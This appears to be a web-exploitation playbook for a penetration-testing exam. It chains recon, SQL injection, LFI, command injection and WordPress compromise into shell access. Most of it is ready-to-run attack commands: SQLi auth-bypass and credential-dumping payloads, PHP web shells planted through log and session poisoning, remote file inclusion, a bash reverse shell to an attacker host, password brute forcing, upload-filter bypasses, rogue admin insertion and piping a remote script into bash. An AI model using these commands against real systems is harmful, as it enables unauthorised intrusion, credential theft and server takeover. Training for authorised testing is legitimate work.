name: Argha Dey Web Exploitation Methodology
description: Combined web-range playbook covering Recon → SQLi → LFI → CMDi → WordPress. Includes detection-to-RCE decision trees for LFI, manual exploitation workflow for CMDi (Read → Enumerate → Shell), and a 9-phase WordPress chain.
examHabits: nmap's http-generator script output often reveals the exact WP version before running WPScan
Save the raw request from Burp and drive sqlmap with -r; don't hand-build -u/-data
Always run --batch in an exam/scripted context
Check every column of every dumped table - CPENT hides the real answer in unexpected columns
If sqlmap fails, manually test with ' AND SLEEP(5) before assuming not injectable
Pivot immediately on any found DB credentials to SSH/other services
quickRef: nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | sqlmap -r request.txt -dbs --batch | wpscan --url http://<ip>/ -e vp,u,vt,cb,m --api-token <token>

decisionPoints.action: nmap -p80,443 -sV --script http-title,http-server-header,http-generator; whatweb http://<ip>/
decisionPoints.fallback: Check for WordPress via readme.html or wp-login.php

decisionPoints.action: Run full WPScan: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks --api-token <token>
decisionPoints.fallback: Proceed with generic web testing

decisionPoints.action: feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt (fast first pass) then big.txt
decisionPoints.fallback: ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php for extension-aware fuzzing

decisionPoints.action: Manually inject single quote (') — if verbose SQL error shows, backend is identified immediately
decisionPoints.fallback: Test ' OR '1'='1' -- - for auth bypass; ' OR SLEEP(5) -- - for time-based blind

decisionPoints.action: Save as request.txt; sqlmap -r request.txt -dbs --batch
decisionPoints.fallback: sqlmap -r request.txt -D <database> --tables --batch

decisionPoints.condition: Table dumped, looking for pivot creds
decisionPoints.action: sqlmap -r request.txt -D <db> -T <table> --columns --batch; --dump only specific columns if needed
decisionPoints.fallback: UNION-based manual: ' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users -- -

decisionPoints.condition: DB credentials found in unexpected column
decisionPoints.action: Pivot to SSH/other service with discovered creds (user_ssh1, user_auth columns)
decisionPoints.fallback: Look for security question answers for password-reset abuse

decisionPoints.condition: ?page= or similar parameter confirmed with /etc/passwd read
decisionPoints.action: Determine filter behavior: try ../, ....//, ..%2f, ..%252f, /etc/passwd (absolute), php://filter wrapper
decisionPoints.fallback: Blind LFI: time-based via huge file, or OOB callback

decisionPoints.action: Fastest path: curl http://<target>/ -A '<?php system($_GET["cmd"]); ?>'; then ?page=.../access.log&cmd=id
decisionPoints.fallback: Try auth.log, vsftpd.log, mail spool

decisionPoints.condition: App stores user input server-side (search/profile/lang cookie)
decisionPoints.action: Poison PHP session file: curl search.php?q=<?php system($_GET['cmd']); ?> -b PHPSESSID=<id>; then ?page=.../sess_<id>&cmd=id
decisionPoints.fallback: Try /proc/self/environ poisoning via User-Agent header

decisionPoints.condition: App has ANY upload (images/PDF even if no .php)
decisionPoints.action: Upload shell.jpg with PHP code; include via LFI (include() executes PHP regardless of extension)
decisionPoints.fallback: php://filter/convert.base64-encode to read config.php for DB creds without RCE

decisionPoints.action: RFI: host payload; ?page=http://<attacker>/shell.txt&cmd=id
decisionPoints.fallback: data:// wrapper: echo -n payload | base64; ?page=data://text/plain;base64,<b64>&cmd=id

decisionPoints.action: Pure info disclosure: read config.php / wp-config.php via php://filter for DB creds → pivot via SQLi/SSH
decisionPoints.fallback: Fall back to commix or manual enumeration

steps.phase: Phase 4 - OS Command Injection (Read → Enumerate → Shell)

decisionPoints.condition: Utility page found (ping.php, diag.php, nslookup.php, traceroute.php)
decisionPoints.action: Test separators: ; id, | id, $(id), `id`, &&, ||, %0a; URL-encode: %3B, %7C, %26
decisionPoints.fallback: Argument injection: --help, -oG output.txt

decisionPoints.action: ?ip=%7C+id; then enumerate: ?ip=|ls -la ../; ?ip=|cat ../filename.txt; ?ip=|sudo -l; ?ip=|find / -perm -4000 -type f
decisionPoints.fallback: If no output: test blind with sleep 5, or OOB via nslookup/curl to attacker

decisionPoints.action: Use ${IFS}, %09 (tab), {cat,/etc/passwd}, or base64 obfuscation: $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
decisionPoints.fallback: Use commix --url=... --level=3 --tamper=space2comment,charencode

decisionPoints.action: Reverse shell: bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' or mkfifo named-pipe nc payload
decisionPoints.fallback: python3 -c 'import socket,subprocess,os;...' or php -r reverse shell

decisionPoints.action: Phase 1: nmap -sC -sV -p80,443 - look for http-generator: WordPress; curl readme.html for exact version
decisionPoints.fallback: Check /wp-login.php, /wp-admin/, /wp-content/plugins/

decisionPoints.action: Phase 2: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --api-token <token>
decisionPoints.fallback: Manual user enum: curl /?author=1 -I (grep location); curl /wp-json/wp/v2/users | jq

decisionPoints.action: Phase 4: wpscan --usernames users.txt --passwords rockyou.txt; OR hydra -l admin -P rockyou.txt <ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'
decisionPoints.fallback: XML-RPC multicall: system.multicall tests many creds per request, evades simple rate-limiting

decisionPoints.action: Phase 5: searchsploit wordpress <plugin-name>; check installed version vs 'Fixed in' version; pull PoC, adapt IP/path
decisionPoints.fallback: nuclei -u http://<ip> -tags wordpress,wp-plugin,cve

decisionPoints.action: Phase 6: Theme Editor RCE (Appearance → Theme Editor → 404 Template → paste php-reverse-shell.php → trigger via /index.php/nonexistent/)
decisionPoints.fallback: Malicious plugin ZIP: mkdir evil-plugin; zip upload; http://<ip>/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id

decisionPoints.condition: No wp-admin but DB access via SQLi/leaked config
decisionPoints.action: Phase 6.6: INSERT admin user into wp_users + wp_usermeta (wp_capabilities = administrator)
decisionPoints.fallback: Read wp-config.php via LFI php://filter for mysql -h <ip> -u wp_user -p to dump wp_users

decisionPoints.action: Phase 9: cat /var/www/html/wp-config.php; mysql -e 'SELECT user_login,user_pass FROM wp_users;'; find / -perm -4000; sudo -l → proceed to standard Linux privesc
decisionPoints.fallback: Check for 777 scripts in cron jobs for instant root

decisionPoints.condition: Upload feature with extension restriction (.pdf/.html/.image only)
decisionPoints.action: Read page source for client-side validation comments; craft PHP reverse shell, rename shell.php.pdf, intercept POST, rewrite filename= to shell.php
decisionPoints.fallback: Change Content-Type to application/octet-stream or flip hidden allow_all=0 → 1

decisionPoints.action: rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php
decisionPoints.fallback: Check for double-extension bypass or null-byte tricks on older PHP

steps.phase: Phase 7 - Config & Backup File Leak Hunting

decisionPoints.action: curl wp-config.php.bak, wp-config.php~, wp-config.php.save, wp-config.php.old, .wp-config.php.swp; wpscan -e cb (config backups) -e dbe (db exports)
decisionPoints.fallback: Check /wp-content/debug.log if WP_DEBUG_LOG enabled

decisionPoints.action: fuzz for: .env, config.php.bak, .git/, backup/*.zip, database.sql, shell.php.bak
decisionPoints.fallback: grep -R -i -E 'pass|secret|key|token' dumped_dir/ after .git extraction

decisionPoints.action: Stabilize: python3 -c 'import pty; pty.spawn("/bin/bash")'; Ctrl+Z; stty raw -echo; fg; export TERM=xterm
decisionPoints.fallback: socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)

decisionPoints.action: curl http://<attacker>/linpeas.sh | bash; check sudo -l, SUID, cron, GTFOBins, world-writable files
decisionPoints.fallback: Manual: id; uname -a; /etc/passwd; env; ps aux; cat /etc/crontab
